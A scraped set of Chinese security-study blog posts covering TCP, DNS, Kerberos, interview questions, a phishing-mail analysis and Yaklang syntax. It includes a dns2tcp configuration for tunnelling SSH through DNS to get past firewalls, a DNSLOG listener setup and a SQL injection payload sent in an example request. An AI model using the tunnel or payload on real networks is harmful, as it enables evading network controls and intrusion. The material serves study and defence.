TIME_WAIT：表示TCP连接的一方已经发送了连接终止请求（FIN包），并收到了对方的确认（ACK）包。在TIME_WAIT状态下，发送方等待一段时间后，保持连接状态清理（ACK包没有丢包），并释放资源。 滑动窗口 TCP能保证可靠传输，但失去了效率，为了在保证可靠性的前提下，尽可能的提高效率，就有了滑动窗口机制 滑动窗口是在数据传输中用于流量控制和可靠传输的一种机制。它允许发送方在不等待接收方确认的情况下连续发送多个数据包，提高了传输效率。 在不引入滑动窗口的情况下： 发送方和接收方一应一答，可靠性确实能得到保证，但其实大部分时间都消耗在了等待ACK上了。 因此滑动窗口就是每次批量发送一波消息，然后再等一波ACK，再发一波消息： 如下图所示： 上图中窗口大小是3000，主机A发送了3000字节的数据，主机B需要确认应答，如果第一个ACK成功返回主机A，说明1~1000的数据发送成功，滑动窗口就会向后移动，并发送下一条数据，保证窗口中的数据都是需要确认应答的，或者是没发出去的。 上述过程都是正常情况下，但也发生丢包或者乱序的情况 情况1：数据包到了，但是ACK丢了 如上图第二个ACK丢了，不用做任何处理也没关系，对于可靠传输没有任何影响，右边ack的数字，1001表示1001之前的数据都收到了，2001表示2001之前的数据都收到了，3001表示3001之前的数据都收到了（后者包括前者）。 情况2：数据包丢了 假设1000的数据包丢了，在1000的数据开始丢的时候，主机A并不知道丢了数据，会继续往下发送数据。 主机B会在收到01000的数据前的应答中返回1001，主机A在接收到重复的几次确认后，会重新发送01000的数据，当主机B收到11000的数据后，会把应答数据变成最新的，例如在主机A重发01000的数据前有发了30006000的数据，并没有丢包，在收到01000的数据后，下一次应答的数字就是6001。 流量控制 对于滑动窗口的大小，也不是随意设置的，如果超出接收方的处理速度，就可能会丢失一些数据，那就还得重传这些数据，效率还得不到提升。因此又有了流量控制机制 流量控制是在数据通信中的一种机制，用于控制发送方的数据发送速率，以适应接收方的处理能力，避免数据的丢失或拥塞。 接收方使用接受缓冲区的剩余空间大小来作为发送方速率（滑动窗口大小）的参考数值 例如一个水桶，发送方就是往桶里放水，接收方就是出水。进水和出水的速度，就决定了水位的高低 接收方会在收到发送方的数据后，会在返回的ACK报文中把当前的缓冲区的剩余空间大小反馈给发送方，对应着TCP报文结构中的16位窗口大小。 在TCP报文结构的选项中，有一个用于调整窗口大小的扩展因子，用于跳转滑动窗口的大小，并不是说窗口的大小只能是16位（64KB） 拥塞控制 拥塞控制是用于控制在网络中发生拥塞时的数据传输速率。当网络中的流量过大，导致网络拥塞时，TCP拥塞控制机制会自动减少发送方的数据传输速率，以避免进一步加剧网络拥塞。 流量控制只是考虑接收方的处理速率，但数据的传输还要经过很多的交换机和路由器。因此我们也要考虑这些中间节点的速率。 拥塞控制机制主要包括四个算法：慢启动，拥塞避免、快重传、快恢复 慢启动 慢启动算法是在TCP连接建立时，发送方初始的数据传输速率较低，然后逐渐增加发送方的数据传输速率，直到网络出现拥塞为止。 拥塞避免 拥塞避免算法是在慢启动阶段结束后，发送方以线性增加的方式增加数据传输速率，以避免过快地增加网络流量。 快重传 快重传算法是当接收方收到重复的数据包时，会立即发送一个重复确认，以通知发送方有数据包丢失，从而使发送方能够更快地重传丢失的数据包。 快恢复 快恢复算法是在接收到重复确认后，发送方将拥塞窗口减半，然后继续进行拥塞避免算法，以减少网络拥塞的影响 对于流量控制和拥塞控制，本质上都是在控制窗口的大小，在实际中较小的那个作为窗口的大小 延时应答 延时应答是指在TCP通信中，当一方发送数据给另一方时，接收方需要向发送方发送一个确认应答，表示已经成功接收到数据。延时应答是指接收方在接收到数据后，不立即发送确认应答，而是等待一段时间后再发送确认应答 接收方在收到发送方的数据后，不会立即返回应答，而是接收方先进行一部分数据的处理然后再返回应答给发送方 延时应答的主要作用是为了优化网络传输性能。TCP协议使用了滑动窗口机制，发送方会根据接收方发送的确认应答来确定下一次发送的数据量。如果接收方立即发送确认应答，那么发送方会立即发送下一批数据，造成网络拥塞。而延时应答可以让发送方在一定时间内累积多个数据包，然后一次性发送确认应答，有效减少了网络流量。 捎带应答 捎带应答是指在TCP通信中，接收方发送确认应答时，可以同时携带自己发送的数据。也就是说，在发送确认应答的同时，可以将自己需要发送的数据一起发送出去。 在网络通信中，典型的通信模型是一发一收 在TCP中，只要把数据发送过去，就会立即由内核返回一个ACK报文，响应数据则是由应用程序里进行负责传输 由于上述两个操作是不同时机传输的，原本是不能把这两个操作合并的，但是因为”延时应答“的存在，会等一会儿，因此就把上述两操作合并了 捎带应答的主要目的是为了减少网络传输的延迟和减少网络负载。在TCP通信中，接收方发送确认应答时会占用网络资源，而且会增加延迟。通过捎带应答，接收方可以在发送确认应答的同时，将自己需要发送的数据一起发送给发送方，减少了网络传输的次数和延迟。 面向字节流 面向字节流是指TCP协议在传输数据时将数据视为连续的字节流进行处理，而不是将数据分割成固定大小的块进行传输。 在TCP通信中，发送方将待发送的数据按照字节流的方式发送给接收方，接收方按照相同的字节流方式接受数据，并将数据重新组装成原始的数据块。 在面向字节流中，有一个问题，叫做”粘包问题“ 粘包问题是指在TCP通信中，发送方将多个小的数据包连续发送给接收方时，接收方可能会将这些数据包合并成一个大的数据包，导致数据的粘连，造成数据解析错误。 就比如我们看一篇没有标点符号的文章，对于那些字是一句话是有很多看法的，TCP也是如此，无法确定哪些是一个完整的应用层数据包 要想解决”粘包问题“，有两种办法： 通过分隔符，约定某个符号作为包的结束标记 通过指定包的长度，比如在数据包的开头位置声明长度 上述方法在自定义的应用层协议，就有典型的实现： xml：分隔符就是结束标签 json：分隔符就是 &#125; protobuf：通过声明长度来确定边界 http：分隔符+长度 TCP的连接异常处理 TCP协议在连接异常处理方面主要涉及以下几个方法： 程序崩溃 正常关机 主机突然关机 网线断开 程序崩溃就是进程异常退出,操作系统会回收进程的资源,包括释放文件的描述符表,相当于调用了socket里的close方法,进而触发FIN报文进行四次挥手 正常关机,系统会强制结束所有进程,那么就和程序崩溃的情况是一样的,进行四次挥手 主机突然关机： 如果是接收方突然关机,发送方并不知道,就会继续发送数据,但发送方收不到ack报文,就会触发超时重传,如果重传几次后,依旧没有应答,就会重置连接,最后放弃连接 如果是发送方突然关机,接收方就只能等着,等一阵之后,就会发送一个”心跳包”,确认连接是否正常 心跳包通常是一个小的数据包，由发送方定期发送给接收方。接收方在收到心跳包后，会立即发送一个确认应答给发送方，表示连接仍然活跃。如果发送方在一定时间内没有收到接收方的确认应答，就可以认为连接已经失效，可以进行相应的处理，如关闭连接或重新建立连接。 网线断开与主机突然关机的处理方式相同,分两种情况处理.","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"网络协议","slug":"网络协议","permalink":"https://www.ixxzhi.cn/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"},{"name":"TCP","slug":"TCP","permalink":"https://www.ixxzhi.cn/tags/TCP/"}]},{"title":"DNS协议详解","slug":"DNS协议详解","date":"2023-09-12T08:14:42.000Z","updated":"2023-09-19T08:29:20.655Z","comments":true,"path":"2023/09/12/DNS协议详解/","link":"","permalink":"https://www.ixxzhi.cn/2023/09/12/DNS%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/","excerpt":"什么是DNS协议 ​ DNS是一种可以将域名和IP地址相互映射的以层次结构分布的数据库系统。DNS系统采用递归查询请求的方式来响应用户的查询，为互联网的运行提供关键性的基础服务。目前绝大多数的防火墙和网络都会开放DNS服务，DNS数据包不会被拦截，因此可以基于DNS协议建立隐蔽信道，从而顺利穿过防火墙，在客户端和服务器之间传输数据。 DNS服务器 ​ 域名对应的IP地址都保存在DNS服务器。我们输入域名，浏览器就会在后台自动向DNS服务器发出请求，获取对应的IP地址。这就是DNS查询。 ​ 举个栗子，当我在浏览器输入www.ixxzhi.cn这个域名，浏览器就要像DNS服务器查询www.ixxzhi.cn对应的IP地址是什么，然后向该IP发出访问请求。 ​ 网上有很多公用的DNS服务器，我们选择Cloudflare公司提供的1.1.1.1进行演示。","text":"什么是DNS协议 ​ DNS是一种可以将域名和IP地址相互映射的以层次结构分布的数据库系统。DNS系统采用递归查询请求的方式来响应用户的查询，为互联网的运行提供关键性的基础服务。目前绝大多数的防火墙和网络都会开放DNS服务，DNS数据包不会被拦截，因此可以基于DNS协议建立隐蔽信道，从而顺利穿过防火墙，在客户端和服务器之间传输数据。 DNS服务器 ​ 域名对应的IP地址都保存在DNS服务器。我们输入域名，浏览器就会在后台自动向DNS服务器发出请求，获取对应的IP地址。这就是DNS查询。 ​ 举个栗子，当我在浏览器输入www.ixxzhi.cn这个域名，浏览器就要像DNS服务器查询www.ixxzhi.cn对应的IP地址是什么，然后向该IP发出访问请求。 ​ 网上有很多公用的DNS服务器，我们选择Cloudflare公司提供的1.1.1.1进行演示。 dig命令 命令行工具dig可以跟DNS服务器互动，我们就用它演示DNS查询。 它的查询语法如下： 1dig @[DNS服务器] [域名] 假设我们要向1.1.1.1查询www.ixxzhi.cn这个域名，就可以执行下面的命令： 1dig @1.1.1.1 www.ixxzhi.cn 正常情况下它会输出一大堆内容： 其中 “ANSWER SECTION”部分，给出了查询到的A记录和CNAME记录等信息。 域名的树状结构 要说清楚DNS完整的查询过程，就必须了解**域名是一个树状结构**。 根 在最上面的是根，但是没有对应的名字。 顶级域名 根下面一级的节点就是最高一级的顶级域名（由于根没有名字，所以在根下面一级的域名就叫做顶级域名）。它分成两种： 通用顶级域名（gTLD，比如.com和.net） 国别顶级域名（ccTLD，比如.cn和.us） 顶级域名又国际域名管理机构ICANN控制，它委托商业公司管理gTLD，委托各国管理自己的国别域名。 二级域名 二级域名就是你在某个顶级域名下面，自己注册的域名。比如，ixxzhi.cn就是我在顶级域名.cn下面注册的。 三级域名 三级域名是二级域名的子域名，是域名拥有者自行设置的，不用得到许可。比如，alist就是ixxzhi.cn的三级域名 域名的逐级查询 这种树状结构的意义在于，**只有上级域名，才知道下一级域名的IP地址，需要逐级查询**。 每一级域名都有自己的DNS服务器，存放下一级域名的IP地址。 所以想要查询三级域名www.ixxzhi.cn的IP地址，需要三个步骤： 查询根域名服务器，获得顶级域名服务器.cn（又称TLD服务器）的IP地址。 查询TLD服务器.cn，获得二级域名服务器ixxzhi.cn的IP地址。 查询二级域名服务器ixxzhi.cn，获得三级域名www.ixxzhi.cn的IP地址。 下面依次演示三个步骤： 做实验之前我们添加一个A记录把test.ixxzhi.cn指向 11.22.33.44 根域名服务器 根域名服务器是最高层次的域名服务器，所有的根域名服务器都知道所有的顶级域名服务器的IP地址。 根域名服务器也是最重要的域名服务器，不管是哪个本地域名服务器，若要对Internet上任何一个域名进行解析，只要自己无法解析，就首先请求根域名服务器。 Internet上有13个根域名服务器，尽管我们将这13个根域名服务器中的每一个都视为单个服务器，但是每个”服务器“实际上是冗余服务器的集群，以提供安全性和可靠性。 12345678910111213A 根：198.41.0.4 A.root-servers.net：美国加利福尼亚州洛杉矶B 根：192.228.79.201 B.root-servers.net：美国弗吉尼亚州马里兰C 根：192.33.4.12 C.root-servers.net：美国纽约州纽约市D 根：199.7.91.13 D.root-servers.net：美国新泽西州贝德明斯特E 根：192.203.230.10 E.root-servers.net：瑞典斯德哥尔摩F 根：192.5.5.241 F.root-servers.net：美国加利福尼亚州棕榈泉G 根：192.112.36.4 G.root-servers.net：荷兰阿姆斯特丹H 根：198.97.190.53 H.root-servers.net：美国华盛顿州西雅图I 根：192.36.148.17 I.root-servers.net：瑞士日内瓦J 根：192.58.128.30 J.root-servers.net：日本东京K 根：193.0.14.129 K.root-servers.net：美国密歇根州兰辛L 根：199.7.83.42 L.root-servers.net：美国加利福尼亚州埃尔塞贡多M 根：202.12.27.33 M.root-servers.net：美国弗吉尼亚州达勒姆 根域名服务器的IP地址是不变的，集成在操作系统里面。操作系统会选其中一台查询TLD服务器的IP地址。 1dig @198.41.0.4 test.ixxzhi.cn 上面示例中，我们选择198.41.0.4，向它发出请求，询问test.ixxzhi.cn的TLD服务器的IP地址。 dig命令的输出结果如下： 因为它给不了 test.ixxzhi.cn 的IP地址，所以输出结果中没有ANSWER SECTION，只有一个AUTHRITY SECTION，给出了 cn.的TLD服务器的域名。下面还有一个ADDITIONAL SECTION，给出了这几台服务器的IP地址（包含IPv4和IPv6两个地址）。 TLD服务器 有了TLD服务器的IP地址以后，我们再选一台接着查询： 1dig @203.119.27.1 test.ixxzhi.cn 上面示例中，203.119.27.1 是随便选的一台 .cn 的TLD服务器，我们向它询问 test.ixxzhi.cn 的IP地址。 它依然没有ANSWER SECTION 的部分，只有AUTHORITY SECTION，给出了二级域名 ixxzhi.cn 的两台DNS服务器。 二级域名的DNS服务器 上面只给出了NS记录？没关系，我们可以通过下面的命令来查询该服务器的IP地址： 1dig zahir.ns.cloudflare.com 我们再向二级域名的DNS服务器查询三级域名的IP地址。 1dig @172.64.35.145 test.ixxzhi.cn 返回结果如下： 这次终于有了ANSWER SECTION，得到了三级域名test.ixxzhi.cn 的IP地址为 11.22.33.44，至此三个步骤的DNS查询全部完成。 DNS递归和迭代查询 迭代查询 ​ 本地域名服务器向根域名服务器的查询通常是采用迭代查询。迭代查询的特点：当根域名服务器收到本地域名服务器发出的迭代查询请求报文时，要么给出所要查询的IP地址，要么告诉本地服务器：“你下一步应当向哪个域名服务器进行查询”。然后让本地服务器进行后续的查询。根域名服务器通常是把自己知道的顶级域名服务器的IP地址告诉本地域名服务器，让本地域名服务器再向顶级域名服务器查询。顶级域名服务器收到本地域名服务器的查询请求后，要么给出所要查询的IP地址，要么告诉本地域名服务器下一步应当向哪一个权威域名服务器进行查询。最后，知道了所要解析的IP地址或报错，然后把这个结果返回给发起查询的主机。 递归查询 ​ 主机向本地域名服务器的查询一般都是采用递归查询。所谓递归查询就是：如果所询问的本地域名服务器不知道被查询域名的IP地址，那么本地域名服务器就以DNS客户端的身份，向其它根域名服务器继续发出查询请求报文，而不是让该主机自己进行下一步查询。递归查询时返回的结果只有两种：查询成功或查询失败。 DNS缓存机制 ​ 一条域名的DNS记录会在本地有两种缓存： 浏览器缓存 操作系统（OS）缓存 ​ 在浏览器中访问的时候，会优先访问浏览器缓存，如果未命中则访问OS缓存，最后再访问DNS服务器（一般是ISP提供）。同时本地的etc/hosts 中也可以记录DNS解析记录。Windows系统在 C:\\Windows\\System32\\drivers\\etc\\hosts。 Windows中刷新dns缓存命令： 1ipconfig /flushdns ​ 而由于很多Linux发行版都没有内置DNS本地缓存，所以无需刷新。DNS记录会有一个TTL值（time to live），单位是秒，意思是这个记录最大有效期是多少。经过实验，OS缓存会参考ttl值，但是不完全等于TTL值，而浏览器DNS缓存的时间跟TTL值无关，每种浏览器都使用一个固定值。 DNS隧道 设置域名服务器 登录你的域名服务商，比如：https://dash.cloudflare.com/ 在自己的域名下面添加一条A记录，名称任意（如 test2.ixxzhi.cn），值为你的VPS服务器的IP地址。 再添加一条NS记录，名称任意（如ns1.ixxzhi.cn），值为上面A记录的名称：test2.ixxzhi.cn 在服务器上运行dns2tcpd 如果安装了dns2tcp，编辑/etc/dns2tcpd.conf，改成如下配置： 1234567listen = 0.0.0.0port = 53# If you change this value, also change the USER variable in /etc/default/dns2tcpduser = nobodychroot = /tmpdomain = ns1.ixxzhi.cn #（上面配置NS记录的域名）resources = ssh:127.0.0.1:22 , smtp:127.0.0.1:25 服务端启动如下命令启动dns2tcpd： 1dns2tcpd -f /etc/dns2tcpd.conf -F -d 2 客户端运行dns2tcpc DNS2TCP 的客户端配置较为简单, 一条命令就行： 1dns2tcpc -r ssh -z ns1.ixxzhi.cn 1.2.3.4 -l 8888 -d 2 -r 后接服务名称, 这里我们用ssh-z 后接NS记录的网址、ip, 注意IP地址最好写上, 可以不写-l 后接本地端口-d 开启 Debug ssh连接测试 至此我们已经成功搭建了DNS隧道。现在我们尝试ssh连接到客户端主机的8888端口： 1ssh root@127.0.0.1 -p 8888 -i rsa.key 自己搭建DNSLOG 设置域名服务器 登录你的域名服务商，比如：https://dash.cloudflare.com/ 在自己的域名下面添加一条A记录，名称任意（如 test2.ixxzhi.cn），值为你的VPS服务器的IP地址。 再添加一条NS记录，名称任意（如ns1.ixxzhi.cn），值为上面A记录的名称：test2.ixxzhi.cn 监听53端口 1tcpdump -n -i eth0 udp dst port 53 发包测试 现在尝试dig 获取一下test1111.ns1.ixxzhi.cn的IP： 1dig test111.ns1.ixxzhi.cn 此时到VPS上查看请求日志： 在这里我们可以看到解析的记录了。 但是由于缓存的原因第一次请求test1111.ns1.ixxzhi.cn之后短时间内请求同一域名不会请求到DNS服务器，所以为了避免重复我们可以第一次请求test1111.a.ns1.ixxzhi.cn，第二次请求test1111.b.ns1.ixxzhi.cn 以此类推。。。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"DNS","slug":"DNS","permalink":"https://www.ixxzhi.cn/tags/DNS/"},{"name":"网络协议","slug":"网络协议","permalink":"https://www.ixxzhi.cn/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"}]},{"title":"kerberos（待更新）","slug":"kerberos","date":"2023-09-08T02:04:14.000Z","updated":"2024-02-23T17:46:01.324Z","comments":true,"path":"2023/09/08/kerberos/","link":"","permalink":"https://www.ixxzhi.cn/2023/09/08/kerberos/","excerpt":"Kerberos协议 Kerberos概述 ​ Kerberos是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端&#x2F;服务器应用程序提供强身份验证。 Kerberos基本概念 Key Distribution Center,or KDC 在启用Kerberos的环境中进行身份验证的受信任源。 Kerberos KDC Server 作为密钥分发中心（KDC）的计算机或服务器。 Kerberos Client 集群中针对KDC进行身份验证的任何计算机。 KDC Admin Account Ambari","text":"Kerberos协议 Kerberos概述 ​ Kerberos是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端&#x2F;服务器应用程序提供强身份验证。 Kerberos基本概念 Key Distribution Center,or KDC 在启用Kerberos的环境中进行身份验证的受信任源。 Kerberos KDC Server 作为密钥分发中心（KDC）的计算机或服务器。 Kerberos Client 集群中针对KDC进行身份验证的任何计算机。 KDC Admin Account Ambari 在Kerberos协议中，主要有以下三个角色： 访问服务的客户端：kerberos客户端是代表需要访问资源的用户进行操作的应用程序，例如打开文件、查询数据库或打印文档。每个Kerberos客户端在访问资源之前都会请求身份验证。 提供服务的服务端：域内提供服务的服务端，服务端都有一个独唯一的SPN。 提供认证服务的KDC：Key Distribution Center，密钥分发中心是一种网络服务，它向活动目录域内的用户和计算机提供会话票据和临时会话密钥，其服务账户为krbtgt。KDC作为活动目录域服务AADS的一部分运行在每个域控制器上。 这里说一下krbtgt账户，该用户是在创建活动目录时系统自动创建的一个账号，其作用是KDC密钥分发中心的服务账号，其密码是系统随机生成的，无法正常登陆主机。 Kerberos是一种基于票据Ticket的认证方式。客户端想要访问服务端的某个服务，首先需要购买服务端认可的ST服务票据(Server Ticket)。也就是说，客户端在访问服务之前需要先买好票，等待服务验票之后才能访问。但是这张票并不能直接购买，需要一张TGT认购权证（Ticket Granting Ticket）。也就是说，客户端在买票之前必须先获得一张TGT认购权证。TGT认购权证和ST服务票据均是由KDC发放；因为KDC是运行在域控制器上，所以说TGT认购权证和ST服务票据均是由域控分发。 Kerberos使用TCP&#x2F;UDP 88端口进行认证，使用TCP&#x2F;UDP 464端口进行密码重置。 Kerberos中一些名词的简称及含义如表所示： 简称 英文全程 中文名称 DC Domain Controller 域控制器 krbtgt KDC密钥分发中心服务账户 KDC Key Distribution Center 密钥分发中心，由域控担任 AD Active Directory 活动目录，里面包含域内用户数据库 AS Authentication Service 认证服务 TGS Ticket Granting Service 票据授予服务 TGT Ticket Granting Ticket TGT认购权证，由KDC的AS认证服务发放 ST Service Ticket ST服务票据，由KDC的TGS票据授予服务发放 ​ Kerberos协议有两个基础认证模块：AS_REQ &amp; AS_REP 和 TGS_REQ &amp; TGS_REP，以及微软扩展的两个认证模块S4U和PAC。S4U是微软为了实现委派而扩展的模块，分为S4U2Self和S4U2Proxy。在Kerberos最初设计的流程里只有说明了如何证明客户端的真实身份，但是并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。因此微软为了解决权限这个问题，引入了PAC（Privilege Attribute Certificate，特权属性证书）的概念。 123456789101112131415161718sequenceDiagramparticipant c as 客户端participant s as 服务器participant sms as SMS服务器participant yys as 三大运营商participant jz as 基站Title: 基础网络身份验证，Cookie，JWTc-&gt;&gt;s: SMS Requestnote over s:生成验证码并保存到服务器s-&gt;&gt;sms: SMS Requestsms--&gt;&gt;yys: SMS Requestyys--&gt;&gt;jz: SMS Codejz--&gt;&gt;用户手机: SMS Codenote over 用户手机:用户接收验证码sms-&gt;&gt;s:SMS Responses-&gt;&gt;c:SMS Responsec-&gt;&gt;s:Login Requsts-&gt;&gt;c:Response 认证过程： AS_REQ：Client向KDC发起AS_REQ,请求凭据是Client Hash加密的时间戳 AS_RESP：KDC使用Client Hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC，PAC包含Client的sid、Client所在的组 TGS_REQ：Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求 TGS_RESP：KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash加密的ST票据（这一步不管用户有没有访问服务的权限，只要TGT正确就返回ST票据） AP_REQ：Client拿着ST票据去请求服务 AP_RESP：服务使用自己的hash解密ST票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限 123456789101112131415161718192021sequenceDiagramTitle: Kerberosparticipant C as Clientparticipant AS as Authenticaton Serviceparticipant TGS as Ticket Granting Serviceparticipant SS as Server ServiceC-&gt;&gt;AS: AS_REQNote left of C:ClientHash加密的时间戳AS-&gt;&gt;C:AS_RESPalt 账密正确 AS--&gt;&gt;C:krbtgt Hash加密的TGTendC-&gt;&gt;TGS: TGS_REQnote left of C: Krbtgt hashi加密的TGTTGS-&gt;&gt;C: TGS_RESPalt 解密正确TGS--&gt;&gt;C:用服务Hash加密的STendC-&gt;&gt;SS: AP_REQnote left of C:用服务Hash加密的STSS-&gt;&gt;C: AP_RESP","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://www.ixxzhi.cn/tags/%E5%86%85%E7%BD%91/"}]},{"title":"面试（持续更新）","slug":"面试","date":"2023-09-05T08:18:04.000Z","updated":"2023-09-19T02:53:10.686Z","comments":true,"path":"2023/09/05/面试/","link":"","permalink":"https://www.ixxzhi.cn/2023/09/05/%E9%9D%A2%E8%AF%95/","excerpt":"面试题","text":"面试题 log4j2反序列化漏洞原理 shiro反序列化漏洞原理 永恒之蓝原理 你研究过哪些网络协议？ DNS原理 DNS隧道原理 https可以被解密吗？ 如果有一个特别大的日志文件，你想看最后100行，你会用什么命令？ tail -f filename -n 100的-f是什么意思？ 看过Windows日志吗？ netstat常用的几个参数是什么？ -ano分别代表什么意思？ sql注入分哪几种？ 报错注入常用哪些函数？ updatexml函数是用来干什么的？ 为什么可以用来报错注入？ ssh爆破怎么判断是否成功？ ssh爆破在流量侧怎么看成功没有？ 1主机侧可以看日志 tcp三次握手四次挥手","categories":[{"name":"个人笔记","slug":"个人笔记","permalink":"https://www.ixxzhi.cn/categories/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"面试","slug":"面试","permalink":"https://www.ixxzhi.cn/tags/%E9%9D%A2%E8%AF%95/"}]},{"title":"钓鱼邮件分析","slug":"钓鱼邮件分析","date":"2023-09-04T06:32:56.000Z","updated":"2023-09-05T04:01:07.948Z","comments":true,"path":"2023/09/04/钓鱼邮件分析/","link":"","permalink":"https://www.ixxzhi.cn/2023/09/04/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E5%88%86%E6%9E%90/","excerpt":"个人税务汇总清缴通知 邮件正文 排查过程","text":"个人税务汇总清缴通知 邮件正文 排查过程 查看发件人信息不属于本单位或国家相关部门邮件地址 解析二维码地址如下 对该地址进行user-agent校验 PC端UA时跳转到http://si.12333.gov.cn/ 移动端UA时跳转到 http://xxxx.huodhgo2.ink/h5/ 即钓鱼页面 测试移动端跳转的页面即钓鱼页面 首页弹出通知需要点击”确定“才可以进行下一步操作 点击确定后会对个人信息进行索取 自此，确定该邮件为钓鱼邮件 修复建议 防火墙针对huodhgo2.ink及huodhgo.ink域名及其解析IP地址进行封禁","categories":[{"name":"实战笔记","slug":"实战笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"钓鱼","slug":"钓鱼","permalink":"https://www.ixxzhi.cn/tags/%E9%92%93%E9%B1%BC/"}]},{"title":"yak学习笔记","slug":"yak学习笔记","date":"2023-09-03T05:52:40.000Z","updated":"2023-09-04T06:59:36.593Z","comments":true,"path":"2023/09/03/yak学习笔记/","link":"","permalink":"https://www.ixxzhi.cn/2023/09/03/yak%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"Yaklang语言简介 Yaklang 是一门上下文无关文法定义的 图灵完备 的程序语言，他基于 YakVM 运行，语法规则定义了 Yaklang 的语言结构 Yaklang 是一个 动态强类型语言 ： Yaklang 允许用户可以在改变变量的值的时候也改变变量的类型； 在进行表达式运算的时候 Yaklang 允许程序或函数识别运行时的准确类型，并进行对应计算； Yaklang 可以 编译 为 YakVM 可以支持的字节码运行； Yaklang 语法博采众长，非常容易上手与学习； Yaklang 可以作为一门“嵌入式语言”被其他语言调用或编译； Yaklang 是业内第一门 CDSL (Cybersecurity Domain Specific Language)，使用图灵完备特性融合原子化的安全能力。","text":"Yaklang语言简介 Yaklang 是一门上下文无关文法定义的 图灵完备 的程序语言，他基于 YakVM 运行，语法规则定义了 Yaklang 的语言结构 Yaklang 是一个 动态强类型语言 ： Yaklang 允许用户可以在改变变量的值的时候也改变变量的类型； 在进行表达式运算的时候 Yaklang 允许程序或函数识别运行时的准确类型，并进行对应计算； Yaklang 可以 编译 为 YakVM 可以支持的字节码运行； Yaklang 语法博采众长，非常容易上手与学习； Yaklang 可以作为一门“嵌入式语言”被其他语言调用或编译； Yaklang 是业内第一门 CDSL (Cybersecurity Domain Specific Language)，使用图灵完备特性融合原子化的安全能力。 Yaklang语法 注释： 123# Comment// Comment/* Comment*/ 声明变量： 1234var a //声明变量avar b,c //声明变量b,cvar d,e=1,2 //声明变量d,e并分别赋值为1，2a,b = 1,2 //此时a=1，b=2 字符串： 1234567&quot;hello world&quot;a = &quot;hello world&quot;a = `hello world`abc = `hello worldhello BingTang`//单引号包裹一个字符c = &#x27;\\x20&#x27; 字节序列： 1234567name = b&quot;hello world&quot;dump(name)]/*([]uint8) (len=11 cap=16) &#123; 00000000 68 65 6c 6c 6f 20 77 6f 72 6c 64 |hello world|&#125;*/ %格式化语法： 123456println(&quot;Hello %v&quot; % &quot;World&quot;)//Hello Worldprintln(&quot;Hello %v %v&quot; % [&quot;World&quot;,&quot;BingTang&quot;])//Hello World BingTangprintln(&quot;Hello %v %05d&quot; % [&quot;World&quot;, 4])//Hello World 00004 模板字符串语法 f-string： 1234a = &quot;World&quot;name = &quot;BingTang&quot;println(f`Hello $&#123;a&#125;,Hello $&#123;name&#125;`)println(f`1+1 = $&#123;1+1&#125;`) 1234567891011121314151617var targetPath = &quot;admin.php?id=1&quot;var addr = &quot;example.com:8080&quot;var payload = codec.EncodeUrl(&quot;1&#x27;or&#x27;&#x27;=&#x27;1&quot;)packet = f`GET /$&#123;targetPath&#125; HTTP/1.1Host: $&#123;addr&#125;key=value&amp;key2=$&#123;payload&#125;`/*GET /admin.php?id=1 HTTP/1.1Host: example.com:8080key=value&amp;key2=%31%27%6f%72%27%27%3d%27%31*/rsp, req, err = poc.HTTP(packet)die(err) Fuzztag 快速执行 x-string： 1234567891011121314151617a = x&quot;Fuzztag int(1-10): &#123;&#123;int(1-10)&#125;&#125;&quot;dump(a)/*([]string) (len=10 cap=10) &#123; (string) (len=20) &quot;Fuzztag int(1-10): 1&quot;, (string) (len=20) &quot;Fuzztag int(1-10): 2&quot;, (string) (len=20) &quot;Fuzztag int(1-10): 3&quot;, (string) (len=20) &quot;Fuzztag int(1-10): 4&quot;, (string) (len=20) &quot;Fuzztag int(1-10): 5&quot;, (string) (len=20) &quot;Fuzztag int(1-10): 6&quot;, (string) (len=20) &quot;Fuzztag int(1-10): 7&quot;, (string) (len=20) &quot;Fuzztag int(1-10): 8&quot;, (string) (len=20) &quot;Fuzztag int(1-10): 9&quot;, (string) (len=21) &quot;Fuzztag int(1-10): 10&quot;&#125;*/ 字符串运算： + 号连接字符串 1234a = &quot;Hello, &quot;b = &quot;World&quot;println(a+b)// Hello, World * 号重复字符串n次 123a = &quot;powerful &quot;println(a * 5 + &quot;yak&quot;)// powerful powerful powerful powerful powerful yak 取子串或子元素： 12345字符串[头下标:尾下标:步长]a = &quot;Hello, Yak&quot;println(a[0]) // Hprintln(a[1:5]) // elloprintln(a[3:0:-1]) // lle 字符串内置方法： 方法名 描述 Reverse() 翻转字符串 Contains(substr) 字符串是否包含substr，如果是则返回 True，否则返回 False ReplaceN(old, new, n) 把 将字符串中的 old 替换成 new,最多替换不超过 n 次 ReplaceAll(old, new) &#x2F; Replace(old, new) 把 将字符串中所有的 old 替换成 new Split(substr) 以 substr 为分隔符截取字符串 SplitN(substr, n) 以 substr 为分隔符截取字符串，最多切割为 n 份 Join(seq) 